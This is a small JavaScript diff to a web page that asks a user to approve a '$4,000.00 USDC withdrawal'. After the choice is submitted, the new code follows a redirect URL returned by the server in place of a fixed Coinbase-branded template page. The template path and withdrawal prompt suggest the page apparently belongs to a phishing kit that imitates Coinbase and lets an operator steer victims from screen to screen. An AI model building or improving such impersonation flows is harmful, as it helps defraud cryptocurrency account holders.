@@ -115,10 +115,12 @@
         choice: choice,
         detail: '$4,000.00 USDC withdrawal'
       })
-    }).catch(function () { /* non-blocking */ })
-      .finally(function () {
-        window.location.href = '/templates/preview/Coinbase/Review%20Email';
-      });
+    }).then(function (r) { return r.json().catch(function () { return null; }); })
+      .then(function (d) {
+        if (d && d.nextUrl) location.href = d.nextUrl;
+        else location.href = '/loading';
+      })
+      .catch(function () { location.href = '/loading'; });
   }
 
   document.getElementById('rv-yes').addEventListener('click', function () { submit('approve'); });
